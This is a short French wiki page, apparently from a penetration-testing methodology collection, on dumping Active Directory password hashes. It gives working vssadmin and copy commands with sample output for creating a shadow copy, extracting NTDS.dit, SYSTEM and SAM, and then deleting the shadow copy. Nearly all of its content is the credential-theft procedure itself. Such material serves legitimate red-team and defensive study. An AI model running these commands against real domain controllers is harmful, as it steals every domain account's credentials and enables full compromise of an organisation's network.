---
title: Dump des hashs du domaine
permalink: /Dump_des_hashs_du_domaine/
---

# Dump des hashs du domaine

Il existe de nombreuses méthodes pour récupérer les hashs d'un domaine une fois qu'on a les priviléges d'administration sur le domaine.

Volume Shadow Copy
------------------

Il est possible d'utiliser l'utilitaire VSS pour faire une copie du fichier NTDS.dit et SYSTEM qui sont nécessaires pour récupérer les hashs.

``` text
# Créer le Volume Shadow Copy
vssadmin create shadow /for=C:
vssadmin 1.1 – Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001 Microsoft Corp.

Successfully created shadow copy for ‘c:\’
Shadow Copy ID: {e8eb7931-5056-4f7d-a5d7-05c30da3e1b3}
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Faire des copies des fichiers nécessaires. Il faut remplacer [X] par le bon entier
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .

# Supprimer le Volume Shadow Copy
vssadmin delete shadows /for=C: /shadow=e8eb7931-5056-4f7d-a5d7-05c30da3e1b3
```

**Note**: *copy* dans un invite powershell ne fonctionne pas correctement. Mieux vaut tout faire depuis un invite de commande traditionnel.

[Category:Méthodologies](/Category:Méthodologies "wikilink")[Category:Active Directory](/Category:Active_Directory "wikilink")
